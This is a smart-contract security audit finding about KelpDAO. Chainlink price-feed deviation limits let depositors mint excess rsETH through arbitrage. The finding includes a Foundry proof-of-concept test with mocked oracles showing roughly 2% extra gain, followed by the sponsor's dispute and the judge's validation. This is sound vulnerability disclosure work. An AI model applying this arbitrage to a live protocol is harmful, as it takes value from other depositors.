[H-01] Possible arbitrage from Chainlink price discrepancy
Submitted bym_Rassska, also found bySBSecurity,Aamir,d3e4,adriro,CatsSecurity,jayfromthe13th,Bauchibred,deth,0xDING99YA,HChang26,almurhasan,PENGUN,anarcheuz, andcirclelooper
Some theory needed
Currently KelpDAO relies on the following chainlink price feeds in order to calculate rsETH/ETH exchange rate:
Price FeedDeviationHeartbeat1rETH/ETH2%86400s2cbETH/ETH1%86400s3stETH/ETH0.5%86400s
As we can see, an acceptable deviation for rETH/ETH price feed is about[-2% 2%], meaning that the nodes will not update an on-chain price, in case the boundaries are not reached within the 24h period. These deviations are significant enough to open an arbitrage opportunities which will impact an overall rsETH/ETH exchange rate badly.For a further analysis we have to look at the current LSD market distribution, which is represented here:
LSDStaked ETHMarket ShareLRTDepositPool ratio1Lido8.95m~77.35%~88.17%2Rocket Pool1.01m~8.76%~9.95%3Coinbase190.549~1.65%~1.88%
WhereLRTDepositPool ratiois an approximate ratio of deposited lsts based on the overall LSD market.
An example of profitable arbitrage
Seeoriginal submissionfor full details.
Final words
Basically, price feeds don’t have to reach those extreme boundaries in order to profit from it. In theory presented above we were able to get +2.3% profit, which is significant in case there is a huge liquidity supplied. The combination of deviations might be absolutely random, since it operates in set of rational numbers. But it will constantly open a small [+1%; +1.5%] arbitrage opportunities to be exploited.
Proof on Concept
To reproduce the case described above, slightly change:LRTOracleMock:contractLRTOracleMock{uint256publicprice;constructor(uint256_price) {price=_price;}functiongetAssetPrice(address)externalviewreturns(uint256) {returnprice;}functionsubmitNewAssetPrice(uint256_newPrice)external{price=_newPrice;}}setUp():contractLRTDepositPoolTestisBaseTest,RSETHTest{LRTDepositPoolpubliclrtDepositPool;functionsetUp()publicvirtualoverride(RSETHTest,BaseTest) {super.setUp();// deploy LRTDepositPoolProxyAdminproxyAdmin=newProxyAdmin();LRTDepositPoolcontractImpl=newLRTDepositPool();TransparentUpgradeableProxycontractProxy=newTransparentUpgradeableProxy(address(contractImpl),address(proxyAdmin),"");lrtDepositPool=LRTDepositPool(address(contractProxy));// initialize RSETH. LRTCOnfig is already initialized in RSETHTestrseth.initialize(address(admin),address(lrtConfig));vm.startPrank(admin);// add rsETH to LRT configlrtConfig.setRSETH(address(rseth));// add oracle to LRT configlrtConfig.setContract(LRTConstants.LRT_ORACLE,address(newLRTOracle()));lrtConfig.setContract(LRTConstants.LRT_DEPOSIT_POOL,address(lrtDepositPool));LRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE)).initialize(address(lrtConfig));lrtDepositPool.initialize(address(lrtConfig));// add minter role for rseth to lrtDepositPoolrseth.grantRole(rseth.MINTER_ROLE(),address(lrtDepositPool));}}test_DepositAsset():functiontest_DepositAsset()external{addressrETHPriceOracle=address(newLRTOracleMock(1.09149e18));addressstETHPriceOracle=address(newLRTOracleMock(0.99891e18));addresscbETHPriceOracle=address(newLRTOracleMock(1.05407e18));LRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE)).updatePriceOracleFor(address(rETH),rETHPriceOracle);LRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE)).updatePriceOracleFor(address(stETH),stETHPriceOracle);LRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE)).updatePriceOracleFor(address(cbETH),cbETHPriceOracle);console.log("rETH/ETH exchange rate after",LRTOracleMock(rETHPriceOracle).getAssetPrice(address(0)));console.log("stETH/ETH exchange rate after",LRTOracleMock(stETHPriceOracle).getAssetPrice(address(0)));console.log("cbETH/ETH exchange rate after",LRTOracleMock(cbETHPriceOracle).getAssetPrice(address(0)));vm.startPrank(alice);// alice provides huge amount of liquidity to the poolrETH.approve(address(lrtDepositPool),9950ether);lrtDepositPool.depositAsset(rETHAddress,9950ether);stETH.approve(address(lrtDepositPool),88170ether);lrtDepositPool.depositAsset(address(stETH),88170ether);cbETH.approve(address(lrtDepositPool),1880ether);lrtDepositPool.depositAsset(address(cbETH),1880ether);vm.stopPrank();vm.startPrank(carol);// carol deposits, when the price feeds return answer pretty close to a spot priceuint256carolBalanceBefore=rseth.balanceOf(address(carol));rETH.approve(address(lrtDepositPool),100ether);lrtDepositPool.depositAsset(address(rETH),100ether);uint256carolBalanceAfter=rseth.balanceOf(address(carol));vm.stopPrank();uint256rETHNewPrice=uint256(LRTOracleMock(rETHPriceOracle).getAssetPrice(address(0))) *102/100;// +2%uint256stETHNewPrice=uint256(LRTOracleMock(stETHPriceOracle).getAssetPrice(address(0))) *995/1000;// -0.5%uint256cbETHNewPrice=uint256(LRTOracleMock(cbETHPriceOracle).getAssetPrice(address(0))) *99/100;// -1%LRTOracleMock(rETHPriceOracle).submitNewAssetPrice(rETHNewPrice);LRTOracleMock(stETHPriceOracle).submitNewAssetPrice(stETHNewPrice);LRTOracleMock(cbETHPriceOracle).submitNewAssetPrice(cbETHNewPrice);console.log("rETH/ETH exchange rate after",LRTOracleMock(rETHPriceOracle).getAssetPrice(address(0)));console.log("stETH/ETH exchange rate after",LRTOracleMock(stETHPriceOracle).getAssetPrice(address(0)));console.log("cbETH/ETH exchange rate after",LRTOracleMock(cbETHPriceOracle).getAssetPrice(address(0)));vm.startPrank(bob);// bob balance of rsETH before deposituint256bobBalanceBefore=rseth.balanceOf(address(bob));rETH.approve(address(lrtDepositPool),100ether);lrtDepositPool.depositAsset(address(rETH),100ether);uint256bobBalanceAfter=rseth.balanceOf(address(bob));vm.stopPrank();assertEq(bobBalanceBefore,carolBalanceBefore,"the balances are not the same");assertGt(bobBalanceAfter,carolBalanceAfter*102/100,"some random shit happened");assertLt(bobBalanceAfter,carolBalanceAfter*103/100,"some random shittttt happened");}
Recommended Mitigation Steps
Short term:
N/A
Long term:
I was thinking about utilizing multiple price oracles, which could potentially close any profitable opportunities, but the gas overhead and overall complexity grows rapidly. Unfortunately, I don’t have anything robust to offer by now, but open to discuss about it.
Assessed type
Math
gus (Kelp) disputed and commented:
We appreciate the explanation at length you have here. We see the arbitrage as a feature rather than a bug in the system. The past 2 year data on the price discrepancy assures us that this is a minor vector that will not impact deposits or withdraws significantly. Moreover, the fact that minters earn nominally more and withdrawals earn nominally less balances the system. We also want to call out that price arbitrage is not a unique problem to our design. It is virtually present across every staking protocol and we encourage healthy arbitrage opportunity here.
0xDjango (judge) commented:
This is valid. Depositors will be able to deposit the minimally-priced asset and steal value from the deposit pool. The deviation % and heartbeat are too large and this will open up arbitrage opportunities to the detriment of Kelp’s users. When Kelp implements the withdrawal mechanism, we will have a better understanding of the profitability of such an attack. For example, if Kelp implements withdrawals without a staking delay, given the large amount of on-chain liquidity of the underlying assets, the pool may be able to be exploited for large amounts given even a 1% price discrepancy between the different LSTs.
Note: seeoriginal submissionfor full discussion.